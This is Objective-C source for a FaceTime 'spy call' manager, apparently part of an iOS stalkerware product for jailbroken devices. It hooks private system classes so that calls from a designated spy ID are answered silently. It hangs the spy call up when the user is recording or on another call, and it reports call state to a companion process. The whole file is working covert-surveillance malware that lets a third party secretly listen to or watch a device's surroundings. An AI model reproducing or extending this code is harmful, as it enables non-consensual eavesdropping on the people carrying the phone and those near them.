//
//  FaceTimeSpyCallManager.m
//  MSSPC
//
//  Created by Makara Khloth on 7/9/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "FaceTimeSpyCallManager.h"
#import "FaceTimeCall.h"
#import "FaceTimeSpyCallUtils.h"

#import "MPConferenceManager.h"
#import "MPConferenceManager+IOS6.h"
#import "SBConferenceManager.h"
#import "SBConferenceManager+IOS6.h"
#import "MPIncomingFaceTimeCallController.h"
#import "MPIncomingFaceTimeCallController+IOS6.h"
#import "CNFConferenceController.h"
#import "CNFConferenceController+IOS6.h"
#import "CNFDisplayController.h"
#import "CNFDisplayController+IOS6.h"
#import "SBUIController.h"
#import "SpringBoard.h"

#import "IMHandle.h"
#import "IMAVChat.h"
#import "IMAVController.h"
#import "IMAVTelephonyManager.h"
#import "IMAVCallManager.h"

// iOS 7
#import "CNFConferenceController+IOS7.h"
#import "TUFaceTimeAudioCall.h"
#import "TUFaceTimeVideoCall.h"

#import "MessagePortIPCSender.h"
#import "DefStd.h"

#import <objc/runtime.h>

id getInstanceVariable(id x, NSString * s) {
    Ivar ivar = class_getInstanceVariable([x class], [s UTF8String]);
    return object_getIvar(x, ivar);
}

static FaceTimeSpyCallManager *_FaceTimeSpyCallManager = nil;

@interface FaceTimeSpyCallManager (private)
- (void) appendFaceTimeCall: (FaceTimeCall *) aFaceTimeCall;
- (void) removeFaceTimeCall: (FaceTimeCall *) aFaceTimeCall;

- (void) ftSpyCallConnected: (FaceTimeCall *) aFaceTimeCall;
- (void) ftSpyCallDisconnected: (FaceTimeCall *) aFaceTimeCall;

- (void) facetimeSpyCallCompletelyHangup;
- (BOOL) isAllSpyCall: (NSArray *) aSpyCalls;
@end

@implementation FaceTimeSpyCallManager

@synthesize mFaceTimeSpyCall, mFaceTimeCall, mFaceTimeCalls, mBlockLockKeyUp, mBlockMenuKeyUp;
@synthesize mCNFDisplayController, mCNFCallViewController;
@synthesize mIsFaceTimeSpyCallCompletelyHangup;

+ (id) sharedFaceTimeSpyCallManager {
	if (_FaceTimeSpyCallManager == nil) {
		_FaceTimeSpyCallManager = [[FaceTimeSpyCallManager alloc] init];
        [_FaceTimeSpyCallManager setMIsFaceTimeSpyCallCompletelyHangup:YES];
	}
	return (_FaceTimeSpyCallManager);
}

- (id) init {
	if ((self = [super init])) {
		mFaceTimeCalls = [[NSMutableArray alloc] initWithCapacity:2];
	}
	return (self);
}

#pragma mark -
#pragma mark Incoming FaceTime call
#pragma mark -

- (void) handleIncomingFaceTimeCall: (FaceTimeCall *) aFaceTimeCall {
	APPLOGVERBOSE (@"[BEFORE] FaceTime call incoming, aFaceTimeCall = %@", aFaceTimeCall);
	
	if ([FaceTimeSpyCallUtils isFaceTimeSpyCall:[aFaceTimeCall facetimeID]]) {
		[aFaceTimeCall setMIsFaceTimeSpyCall:YES];
		[self setMFaceTimeSpyCall:aFaceTimeCall];
	} else {
		[aFaceTimeCall setMIsFaceTimeSpyCall:NO];
	}
	
	APPLOGVERBOSE (@"[AFTER] FaceTime call incoming, aFaceTimeCall = %@", aFaceTimeCall);
	
	Class $CNFConferenceController = objc_getClass("CNFConferenceController");
	CNFConferenceController *cnfConferenceController = [$CNFConferenceController sharedInstance];
    APPLOGVERBOSE (@"Class of CNFConferenceController = %@", $CNFConferenceController);
    if ([cnfConferenceController respondsToSelector:@selector(avChat)]) {
        // These methods are no longer exist in iOS 8, call to these methods hang thread
        APPLOGVERBOSE (@"avChat = %@", [cnfConferenceController avChat]);
        APPLOGVERBOSE (@"currentCallRemoteUserId = %@", [cnfConferenceController currentCallRemoteUserId]);
        APPLOGVERBOSE (@"remoteParticipant = %@", [cnfConferenceController remoteParticipant]);
    }
	
	Class $IMAVCallManager = objc_getClass("IMAVCallManager");
	IMAVCallManager *avIMCallManager = [$IMAVCallManager sharedInstance];
	APPLOGVERBOSE (@"_FTCalls = %@", [avIMCallManager _FTCalls]); // Always return empty array
	APPLOGVERBOSE (@"_hasActiveFaceTimeCall = %d", [avIMCallManager _hasActiveFaceTimeCall]);
    if ([avIMCallManager respondsToSelector:@selector(calls)]) {
        APPLOGVERBOSE (@"calls = %@", [avIMCallManager calls]);
        APPLOGVERBOSE (@"calls count = %d", [[avIMCallManager calls] count]);
    }
	
//	SBUIController *sbUIController	= [objc_getClass("SBUIController") sharedInstance];
//	UIWindow *_window				= getInstanceVariable(sbUIController, @"_window");
//	APPLOGVERBOSE (@"_window's subviews = %@", [_window subviews]);
	
//	CNFDisplayController *displayController = [self mCNFDisplayController];
//	APPLOGVERBOSE (@"displayController's view = %@", [displayController view]);
	
	if ([aFaceTimeCall mIsFaceTimeSpyCall]) {
	
		// Cannot use this checking (alway return true every time FaceTime spy call come in)
//		BOOL isInConference = NO;
//		if ([cnfConferenceController respondsToSelector:@selector(isInConference)]) {
//			isInConference = YES;
//		} else if ([cnfConferenceController respondsToSelector:@selector(inFaceTime)]) {
//			isInConference = YES;
//		}
        
        Class $SBConferenceManager = objc_getClass("SBConferenceManager");
        SBConferenceManager *sbConferenceManager = [$SBConferenceManager sharedInstance];
        APPLOGVERBOSE (@"currentCallStatusDisplayString = %@", [sbConferenceManager currentCallStatusDisplayString]);
        APPLOGVERBOSE (@"currentCallRemoteUserId = %@", [sbConferenceManager currentCallRemoteUserId]);
        sbConferenceManager = nil;
        
        /*
         NOTE:
         ----
         Use case 1: Pre-condition, No active FaceTime call on device
            - iOS 7, when there is an incoming FaceTime call currentCallRemoteUserId is nil
            - iOS 5 & iOS 6, where there is an incoming FaceTime call currentCallRemoteUserId is the id of that incoming call
         
         Use case 2: Pre-condition, there is an active FaceTime call on device
            - iOS 7, when there is an incoming FaceTime call currentCallRemoteUserId is existing active FaceTime call
            - iOS 5 & 6, NOT TEST
         
         +++ From iOS 5 to 7, FaceTime is one-to-one call
         */
		
        BOOL answerCall = NO;
        if ([cnfConferenceController respondsToSelector:@selector(avChat)]) { // Below iOS 8
            if ([[aFaceTimeCall facetimeID] isEqualToString:[cnfConferenceController currentCallRemoteUserId]]  ||  // iOS 5 & iOS 6
                [cnfConferenceController currentCallRemoteUserId] == nil) {                                         // iOS 7
                answerCall = YES;
            }
        } else { // iOS 8 onward
            if ([avIMCallManager respondsToSelector:@selector(calls)]) {
                if ([[avIMCallManager calls] count] <= 1) {      // iOS 8
                    // Count from avIMCallManager will include FaceTime spy call too
                    answerCall = YES;
                } else {
                    /*
                     Often after spy call (audio/video) ended for a short time, user make another spy call (audio/video, the same ID),
                     [avIMCallManager calls] return two calls and both are spy call by its ID.
                     
                     So the assumption is that system take sometime to remove previous spy call internally
                     */
                    
                    answerCall = [self isAllSpyCall:[avIMCallManager calls]];
                }
            }
        }
        APPLOGVERBOSE(@"answerCall = %d", answerCall);
		
        //if ([[self mFaceTimeCalls] count] == 0) {
		if (answerCall) {
			if (![FaceTimeSpyCallUtils isRecordingPlaying]) {
				if ([aFaceTimeCall mIMHandle]) {
					[cnfConferenceController acceptFaceTimeInvitationForConferenceID:[aFaceTimeCall mConversationID]
																		  fromHandle:[aFaceTimeCall mIMHandle]];
				} else if ([aFaceTimeCall mInviter]) {
					[cnfConferenceController acceptFaceTimeInvitationFrom:[aFaceTimeCall mInviter]
															 conferenceID:[aFaceTimeCall mConversationID]];
				} else if ([aFaceTimeCall mIMAVChatProxy]) {
                    [cnfConferenceController acceptFaceTimeInvitationForChat:[aFaceTimeCall mIMAVChatProxy]];
                } else if ([aFaceTimeCall mFaceTimeAudioCall]) {
                    [FaceTimeSpyCallUtils prepareToAnswerFaceTimeCall];
                    [[aFaceTimeCall mFaceTimeAudioCall] answer];
                } else if ([aFaceTimeCall mFaceTimeVideoCall]) {
                    [FaceTimeSpyCallUtils prepareToAnswerFaceTimeCall];
                    [[aFaceTimeCall mFaceTimeVideoCall] answer];
                }
				
				//SpringBoard *sb = (SpringBoard *)[UIApplication sharedApplication];
				//SBApplication *sbApp = [sb _accessibilityFrontMostApplication];
				//NSString *bundleIndentifier = [sbApp bundleIdentifier];
				//if (![bundleIndentifier isEqualToString:@"com.apple.mobilephone"]) {
				//	[self ftSpyCallConnected:aFaceTimeCall];
				//}
				
				[self ftSpyCallConnected:aFaceTimeCall];
				
			} else {
				// Playing or recording
				APPLOGVERBOSE (@"Device is playing or recording");
                [self setMIsFaceTimeSpyCallCompletelyHangup:NO]; // Status is expanding from reject to spy call ended
				[self performSelector:@selector(endFaceTimeSpyCall)
						   withObject:nil
						   afterDelay:0.1];
			}
		} else {
			// Normal FaceTime call is in conference
			APPLOGVERBOSE (@"Device is already in conference");
            [self setMIsFaceTimeSpyCallCompletelyHangup:NO]; // Status is expanding from reject to spy call ended
			[self performSelector:@selector(endFaceTimeSpyCall)
					   withObject:nil
					   afterDelay:0.1];
		}
	} else {
		// Not FaceTime spy call then:
		// - If FaceTime is in progress
		APPLOGVERBOSE (@"Incoming FaceTime call is not a FaceTime spy call");
		if ([self mFaceTimeSpyCall]) {
			APPLOGVERBOSE (@"But FaceTime spy call is in progress");
            
            [NSObject cancelPreviousPerformRequestsWithTarget:self selector:@selector(endFaceTimeSpyCall) object:nil];
			[self performSelector:@selector(endFaceTimeSpyCall)
					   withObject:nil
					   afterDelay:0.1];
		}
	}
	
	//[self appendFaceTimeCall:aFaceTimeCall];
}

#pragma mark -
#pragma mark Incoming waiting FaceTime call
#pragma mark -

- (void) handleIncomingWaitingFaceTimeCall: (FaceTimeCall *) aFaceTimeCall {
	APPLOGVERBOSE (@"FaceTime call waiting, aFaceTimeCall = %@", aFaceTimeCall);
	
	// Handle the same way incoming call...
	[self handleIncomingFaceTimeCall:aFaceTimeCall];
}

#pragma mark -
#pragma mark FaceTime call ended
#pragma mark -

- (void) handleFaceTimeCallEnd: (FaceTimeCall *) aFaceTimeCall {
	APPLOGVERBOSE (@"FaceTime call ended, aFaceTimeCall = %@", aFaceTimeCall);
	if ([FaceTimeSpyCallUtils isFaceTimeSpyCall:[aFaceTimeCall facetimeID]]) {
		[self setMFaceTimeSpyCall:nil];
		[aFaceTimeCall setMIsFaceTimeSpyCall:YES];
		[self ftSpyCallDisconnected:aFaceTimeCall];
        
        [self setMIsFaceTimeSpyCallCompletelyHangup:NO]; // Status is expanding from spy call ended to 1.0 second later
        [self performSelector:@selector(facetimeSpyCallCompletelyHangup) withObject:nil afterDelay:1.0];
	}
	
	//[self removeFaceTimeCall:aFaceTimeCall];
}

#pragma mark -
#pragma mark Public methods
#pragma mark -

- (void) endFaceTimeSpyCall {
    APPLOGVERBOSE (@"End FaceTime spy call, %@", [self mFaceTimeCall]);
	if ([self mFaceTimeSpyCall]) {
		Class $CNFConferenceController = objc_getClass("CNFConferenceController");
		CNFConferenceController *cnfConferenceController = [$CNFConferenceController sharedInstance];
		FaceTimeCall *ftSpyCall = [self mFaceTimeSpyCall];
		if ([ftSpyCall mIMHandle]) {
			[cnfConferenceController declineFaceTimeInvitationForConferenceID:[ftSpyCall mConversationID]
																   fromHandle:[ftSpyCall mIMHandle]];
		} else if ([ftSpyCall mInviter]) {
			[cnfConferenceController rejectFaceTimeInvitationFrom:[ftSpyCall mInviter]
													 conferenceID:[ftSpyCall mConversationID]];
		} else if ([ftSpyCall mIMAVChatProxy]) {
            [cnfConferenceController declineFaceTimeInvitationForChat:[ftSpyCall mIMAVChatProxy]];
        } else if ([ftSpyCall mFaceTimeAudioCall]) {
            [[ftSpyCall mFaceTimeAudioCall] disconnect];
        } else if ([ftSpyCall mFaceTimeVideoCall]) {
            [[ftSpyCall mFaceTimeVideoCall] disconnect];
        }
	}
}

- (void) endFaceTime {
	if ([self isInFaceTime]) {
		Class $SBConferenceManager = objc_getClass("SBConferenceManager");
		SBConferenceManager *sbConferenceManager = [$SBConferenceManager sharedInstance];
		
		if ([sbConferenceManager respondsToSelector:@selector(endConference)]) {
			[sbConferenceManager endConference];
		} else if ([sbConferenceManager respondsToSelector:@selector(endFaceTime)]) { // iOS 7,8
			[sbConferenceManager endFaceTime];
		}
		
		Class $CNFConferenceController = objc_getClass("CNFConferenceController");
		CNFConferenceController *cnfConferenceController = [$CNFConferenceController sharedInstance];
        if ([cnfConferenceController respondsToSelector:@selector(_cleanUpAfterAVChat)]) { // No this method in iOS 8 onward
            [cnfConferenceController _cleanUpAfterAVChat];
        }
	}
}

- (BOOL) isInFaceTime {
	BOOL inFaceTime = NO;
	Class $SBConferenceManager = objc_getClass("SBConferenceManager");
	SBConferenceManager *sbConferenceManager = [$SBConferenceManager sharedInstance];
	if ([sbConferenceManager respondsToSelector:@selector(inConference)]) {
		inFaceTime = [sbConferenceManager inConference];
	} else if ([sbConferenceManager respondsToSelector:@selector(inFaceTime)]) {
		inFaceTime = [sbConferenceManager inFaceTime];
	}
	return (inFaceTime);
}

- (void) endFaceTimeIfAny {
	if ([self isInFaceTime]) {
		[self endFaceTime];
	}
}

#pragma mark -
#pragma mark Private methods
#pragma mark -

- (void) appendFaceTimeCall: (FaceTimeCall *) aFaceTimeCall {
	BOOL exist = NO;
	for (FaceTimeCall *ftCall in [self mFaceTimeCalls]) {
		if ([ftCall isEqualToFaceTimeCall:aFaceTimeCall]) {
			exist = YES;
			break;
		}
	}
	
	if (!exist) {
		[[self mFaceTimeCalls] addObject:aFaceTimeCall];
	}
	APPLOGVERBOSE (@"After appended, all FaceTime calls = %@", [self mFaceTimeCalls]);
}

- (void) removeFaceTimeCall: (FaceTimeCall *) aFaceTimeCall {
	NSInteger index = -1;
	for (NSInteger i = 0; i < [[self mFaceTimeCalls] count]; i++) {
		FaceTimeCall *ftCall = [[self mFaceTimeCalls] objectAtIndex:i];
		if ([ftCall isEqualToFaceTimeCall:aFaceTimeCall]) {
			index = i;
			break;
		}
	}
	
	if (index != -1) {
		[[self mFaceTimeCalls] removeObjectAtIndex:index];
	}
	
	APPLOGVERBOSE (@"After removed, all FaceTime calls = %@", [self mFaceTimeCalls]);
}

- (void) ftSpyCallConnected: (FaceTimeCall *) aFaceTimeCall {
	NSInteger cmd = 1;
	NSMutableData *cmdData = [NSMutableData dataWithBytes:&cmd length:sizeof(NSInteger)];
	NSString *facetimeID = [aFaceTimeCall facetimeID];
	NSInteger length = [facetimeID lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	[cmdData appendBytes:&length length:sizeof(NSInteger)];
	[cmdData appendData:[facetimeID dataUsingEncoding:NSUTF8StringEncoding]];
	MessagePortIPCSender * sender = [[MessagePortIPCSender alloc]initWithPortName:kFaceTimeSpyCallMSCommandMsgPort];
	[sender writeDataToPort:cmdData];
	[sender release];
}

- (void) ftSpyCallDisconnected: (FaceTimeCall *) aFaceTimeCall {
	NSInteger cmd = 0;
	NSMutableData *cmdData = [NSMutableData dataWithBytes:&cmd length:sizeof(NSInteger)];
	NSString *facetimeID = [aFaceTimeCall facetimeID];
	NSInteger length = [facetimeID lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	[cmdData appendBytes:&length length:sizeof(NSInteger)];
	[cmdData appendData:[facetimeID dataUsingEncoding:NSUTF8StringEncoding]];
	MessagePortIPCSender * sender = [[MessagePortIPCSender alloc]initWithPortName:kFaceTimeSpyCallMSCommandMsgPort];
	[sender writeDataToPort:cmdData];
	[sender release];
}

- (void) facetimeSpyCallCompletelyHangup {
    APPLOGVERBOSE (@"FaceTime spy call is completely hang up");
    [self setMIsFaceTimeSpyCallCompletelyHangup:YES];
}

- (BOOL) isAllSpyCall: (NSArray *) aSpyCalls {
    BOOL allSpyCall = YES;
    for (id call in aSpyCalls) {
        APPLOGVERBOSE(@"call = %@, %@", [call class], call); // IMAVChatProxy for both audio and video FaceTime
        Class $IMAVChatProxy = objc_getClass("IMAVChatProxy");
        if ([call isKindOfClass:$IMAVChatProxy]) {
            IMAVChatProxy *imavChatProxy = call;
            IMHandle *imHandle = [imavChatProxy otherIMHandle];
            if (![FaceTimeSpyCallUtils isFaceTimeSpyCall:[imHandle displayID]]) {
                allSpyCall = NO;
                break;
            }
        } else {
            allSpyCall = NO;
            break;
        }
    }
    return (allSpyCall);
}

#pragma mark -
#pragma mark Singleton functions
#pragma mark -

- (id)retain {
	return (self);
}

- (NSUInteger)retainCount {
	return (NSUIntegerMax);  //denotes an object that cannot be released
}

- (void)release {
	//do nothing
}

- (id)autorelease {
	return (self);
}

- (void) dealloc {
	_FaceTimeSpyCallManager = nil;
	
	[mFaceTimeSpyCall release];
	[mFaceTimeCalls release];
	[mCNFDisplayController release];
	[mCNFCallViewController release];
	[super dealloc];
}

@end
